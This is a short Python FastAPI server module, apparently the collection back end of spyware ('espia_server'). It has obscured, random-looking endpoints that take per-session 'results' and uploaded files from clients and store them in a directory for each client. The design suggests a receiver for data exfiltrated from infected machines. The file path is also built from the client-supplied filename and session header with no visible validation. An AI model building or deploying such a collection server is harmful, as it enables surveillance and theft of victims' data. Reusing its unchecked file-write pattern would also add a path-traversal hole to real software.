from fastapi import FastAPI, File, UploadFile, Request

from espia_server.app.utils import handle_products_results, handle_new_uploaded_file, create_new_client_dir

app = FastAPI()


@app.get("/")
def root_path() -> dict:
    return {}


@app.post("/zn1123n/asnndj")
def upload_results(results: dict) -> dict:
    session_id = results.get('Session-ID')
    create_new_client_dir(session_id)
    handle_products_results(session_id, results)
    return {}


@app.post("/zn1123n/asnndj/bbcsgq")
async def create_upload_file(request: Request, fileUpload: UploadFile = File(...)) -> dict:
    file_path = handle_new_uploaded_file(request.headers.get('Session'), fileUpload.filename)
    with open(file_path, 'wb') as f:
        content = await fileUpload.read()
        f.write(content)
    return {}
